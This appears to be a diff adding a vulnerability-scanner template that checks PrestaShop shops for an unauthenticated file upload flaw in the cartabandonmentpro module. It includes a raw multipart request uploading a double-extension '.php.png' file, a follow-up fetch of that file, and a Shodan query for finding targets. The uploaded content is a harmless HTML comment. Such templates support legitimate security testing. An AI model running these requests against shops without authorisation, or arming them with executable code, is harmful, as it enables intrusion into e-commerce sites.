@@ -1,0 +1,49 @@
+id: prestashop-cartabandonmentpro-file-upload
+
+info:
+  name: Prestashop Cart Abandonment Pro File Upload
+  author: MaStErChO
+  severity: critical
+  reference:
+    - https://www.openservis.cz/prestashop-blog/nejcastejsi-utoky-v-roce-2023-seznam-deravych-modulu-nemate-nejaky-z-nich-na-e-shopu-i-vy/
+    - https://dh42.com/blog/prestashop-security/
+  metadata:
+    framework: prestashop
+    shodan-query: http.component:"prestashop"
+    verified: true
+    max-request: 1
+  tags: intrusive,file-upload,cartabandonmentpro,prestashop
+
+variables:
+  filename: '{{rand_base(7, "abc")}}'
+  title: '{{rand_base(7, "abc")}}'
+
+http:
+  - raw:
+      - |
+        POST /modules/cartabandonmentpro/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=xYzZY
+
+        --xYzZY
+        Content-Disposition: form-data; name="image"; filename="{{filename}}.php.png"
+        Content-Type: image/png
+
+        <html>
+        <!-- {{title}} -->
+        </html>
+
+        --xYzZY--
+
+      - |
+        GET /modules/cartabandonmentpro/uploads/{{filename}}.php.png HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(header_2, "image/png")'
+          - 'contains(body_1, "{{filename}}.php.png")'
+          - 'status_code_1 == 200 && status_code_2 == 200'
+        condition: and
+# digest: 4b0a00483046022100de92782af5f1630bc6e15e5f559a18b2d829e22e0cea3452c013a54974c9c84f0221009371017eb7a14acd8fc29c5975ef5cd9f0b8f73582066b39db1294758b231b6a:922c64590222798bb761d5b6d8e72950
